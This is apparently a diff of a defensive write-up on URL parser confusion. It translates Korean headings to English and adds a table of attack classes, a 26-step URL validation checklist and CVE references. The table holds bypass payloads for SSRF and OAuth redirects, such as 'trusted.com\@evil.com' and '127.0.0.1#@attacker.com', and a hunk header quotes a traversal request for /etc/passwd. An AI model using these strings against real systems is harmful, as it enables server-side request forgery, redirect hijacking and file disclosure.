+| **IDN Homograph** | Unicode visual similarity | RFC 3987, WHATWG §3.3 | Cyrillic 'а' vs Latin 'a' | Punycode conversion, block mixed-script |
+| **Cache Key Confusion** | Non-normalized URL → Different cache key | RFC 3986 §6.2.2 | `/api` vs `/api/%2F` | Generate cache key from normalized URL |
+| **Parser Differential SSRF** | Validation parser ≠ Request parser | Implementation inconsistencies | Spring UriComponentsBuilder | Use same parser, apply Spring patches |
+| **TOCTOU via DNS Rebinding** | Time gap between DNS validation and use | No spec for validation timing | DNS: 1.2.3.4 → validate → change to 127.0.0.1 → use | Pin resolved IP, disable redirects, re-validate |
+| **Evil Slash OAuth Bypass** | Backslash/slash confusion in redirect_uri | WHATWG vs RFC 3986 | `https://trusted.com\@evil.com` | Exact string match for redirect_uri, not prefix matching |
+| **Colon-Slash Hostname Confusion** | Colon included in hostname by some parsers | urlparse vs requests differential | `http://localhost:\@google.com` | Validate final parsed hostname from actual request library |
+| **Fragment in Authority** | Fragment delimiter in userinfo/host | RFC 3986 precedence ambiguity | `http://127.0.0.1#@attacker.com` | Strict RFC 3986 component extraction, reject ambiguous URLs |
+| **Scheme Inference** | Missing scheme inferred differently | RFC 3986 vs RFC 2396 vs WHATWG | `//host/path` interpreted as different schemes | Always require explicit absolute URI with scheme |
+| **Backslash in OAuth redirect_uri** | Browser normalizes backslash to slash | WHATWG normalization | `/\tevil.com` appears relative but redirects absolute | Reject control characters and backslashes in redirect_uri |
+
+---
+
+## Appendix: Security Validation Checklist
+
+### Input Validation Stage
+
+- [ ] **1. Enforce Absolute URI**: Allow only absolute URIs with scheme specified (reject relative URLs)
+- [ ] **2. Prohibit Userinfo**: Immediately reject URLs containing `user:pass@host` format
+- [ ] **3. Check Control Characters**: Reject if contains control characters like tab (`\t`), newline (`\n`, `\r`), NULL (prohibit auto-removal)
+- [ ] **4. Check Backslashes**: Reject if contains backslash (`\`) or establish explicit normalization policy
+
+### Normalization Stage
+
+- [ ] **5. Percent-Decoding (Once Only)**: Decode exactly once immediately upon receiving input (prohibit recursive decoding)
+- [ ] **6. Decode Unreserved Characters**: Decode when finding `A-Za-z0-9-._~` encoding
+- [ ] **7. Lowercase Scheme/Host**: Convert only scheme and host to lowercase (preserve path case)
+- [ ] **8. Path Normalization**: Apply `remove_dot_segments` algorithm (remove `.` and `..`)
+- [ ] **9. Remove Default Port**: Remove when default port specified (HTTP:80, HTTPS:443, etc.)
+- [ ] **10. Handle Trailing Dot**: Remove trailing `.` in domain or establish explicit policy
+- [ ] **11. IDN Punycode Conversion**: Convert Unicode domains to Punycode
+
+### Security Validation Stage
+
+- [ ] **12. IP Address Normalization**: Convert all formats (octal, hex, integer) to canonical form before validation
+- [ ] **13. Allow-list Validation**: Compare scheme, host, port combination against allow-list (prohibit deny-lists)
+- [ ] **14. Block Internal IPs**: Check if normalized IP is in internal network ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16, etc.)
+- [ ] **15. Path Scope Validation**: Verify normalized path is inside DocumentRoot or allowed directory
+- [ ] **16. Symlink Validation**: Resolve symlink paths to actual paths (`realpath()`) and re-validate
+
+### Execution Stage
+
+- [ ] **17. Use Same Parser**: Perform actual request with same parser used for validation
+- [ ] **18. Prohibit Re-parsing**: Never re-parse URL after validation (reuse validated object)
+- [ ] **19. Restrict Redirects**: Disable automatic HTTP redirect following or validate redirect targets too
+- [ ] **20. Set Timeouts**: Set short connection and read timeouts to prevent slowloris attacks
+
+### Logging and Monitoring
+
+- [ ] **21. URL Masking**: Mask userinfo, fragments, sensitive query parameters in URLs before logging
+- [ ] **22. Failure Logging**: Log input values and failure reasons on URL validation failures (for attack pattern analysis)
+- [ ] **23. Anomaly Pattern Detection**: Alert on repeated validation failures from same IP
+
+### Architecture Level
+
+- [ ] **24. Single URL Parser Library**: Use only one verified URL parser library across entire application
+- [ ] **25. Regular Updates**: Keep URL parser libraries and HTTP clients updated (monitor CVEs)
+- [ ] **26. Principle of Least Privilege**: Minimize privileges of service accounts handling URL requests
+
+---
+
+## References and Sources
+
+### RFCs and Standards
 - [RFC 3986 - Uniform Resource Identifier (URI): Generic Syntax](https://www.rfc-editor.org/rfc/rfc3986.html)
 - [WHATWG URL Living Standard](https://url.spec.whatwg.org/)
 - [RFC 3987 - Internationalized Resource Identifiers (IRIs)](https://www.rfc-editor.org/rfc/rfc3987.html)
 
-### CVE 및 보안 권고
+### CVEs and Security Advisories
+- [CVE-2025-0454: autogpt SSRF via URL Parsing Confusion](https://nvd.nist.gov/vuln/detail/CVE-2025-0454)
 - [CVE-2024-22259: Spring Framework URL Parsing with Host Validation](https://spring.io/security/cve-2024-22259/)
 - [CVE-2024-22243: Spring Framework URL Parsing with Host Validation](https://spring.io/security/cve-2024-22243/)
 - [CVE-2024-22262: Spring Framework URL Parsing with Host Validation (3rd report)](https://spring.io/security/cve-2024-22262/)
 - [CVE-2024-30043: SharePoint XXE via URL Parsing Confusion](https://www.thezdi.com/blog/2024/5/29/cve-2024-30043-abusing-url-parsing-confusion-to-exploit-xxe-on-sharepoint-server-and-cloud)
 - [CVE-2024-38473, CVE-2024-38476, CVE-2024-38477: Apache HTTP Server Confusion Attacks](https://httpd.apache.org/security/vulnerabilities_24.html)
+- [CVE-2022-2216, CVE-2022-2900: parse-url SSRF Vulnerabilities](https://security.snyk.io/vuln/SNYK-JS-PARSEURL-2936249)
 - [CVE-2021-41773: Apache HTTP Server Path Traversal](https://www.hackthebox.com/blog/cve-2021-41773-explained)
+- [CVE-2021-39191, CVE-2021-32786: mod_auth_openidc Open Redirect](https://security.snyk.io/vuln/SNYK-RHEL8-MODAUTHOPENIDC-1583397)
 
-### 연구 논문 및 컨퍼런스 발표
+### Research Papers and Conference Presentations
 - [Orange Tsai - Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server (Black Hat USA 2024)](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
 - [PortSwigger Research - URL validation bypass cheat sheet (2024 Edition)](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)
 - [Snyk - URL confusion vulnerabilities in the wild: Exploring parser inconsistencies](https://snyk.io/blog/url-confusion-vulnerabilities/)
@@ -1144,25 +1558,25 @@ GET /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
 - [Orange Tsai - A New Era of SSRF: Exploiting URL Parser in Trending Programming Languages (Black Hat 2017)](https://blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)
 - [Black Hat USA 2019 - HostSplit: Exploitable Antipatterns in Unicode Normalization](https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)
 
-### 실무 가이드 및 도구
+### Practical Guides and Tools
 - [OWASP - Server Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
 - [PortSwigger - What is SSRF (Server-side request forgery)?](https://portswigger.net/web-security/ssrf)
 - [GitHub - Axios Issue #7315: Normalization of url cause an ssrf security bypass](https://github.com/axios/axios/issues/7315)
 - [Joshua Rogers - proxy_pass: nginx's Dangerous URL Normalization](https://joshua.hu/proxy-pass-nginx-decoding-normalizing-url-path-dangerous)
 
-### 기타 참고 자료
+### Other Resources
 - [Wikipedia - Percent-encoding](https://en.wikipedia.org/wiki/Percent-encoding)
 - [Neil Madden - Can you ever (safely) include credentials in a URL?](https://neilmadden.blog/2019/01/16/can-you-ever-safely-include-credentials-in-a-url/)
 - [Medium - Say goodbye to URLs with embedded credentials](https://medium.com/@lmakarov/say-goodbye-to-urls-with-embedded-credentials-b051f6c7b6a3)
 
 ---
 
-## 문서 변경 이력
+## Document Revision History
 
-| 날짜 | 버전 | 변경 내용 |
-|------|------|----------|
-| 2026-02-08 | 1.0 | 초판 작성 - RFC 3986 및 WHATWG URL Standard 기반 보안 분석 |
+| Date | Version | Changes |
+|------|---------|---------|
+| 2026-02-08 | 1.0 | Initial draft - Security analysis based on RFC 3986 and WHATWG URL Standard |
 
 ---
 
-**면책 조항**: 이 문서는 교육 및 보안 연구 목적으로 작성되었습니다. 여기에 설명된 공격 기법을 무단으로 사용하는 것은 불법이며, 저자는 이 정보의 오용에 대해 책임지지 않습니다.
+**Disclaimer**: This document is written for educational and security research purposes. Unauthorized use of the attack techniques described herein is illegal, and the author is not responsible for misuse of this information.
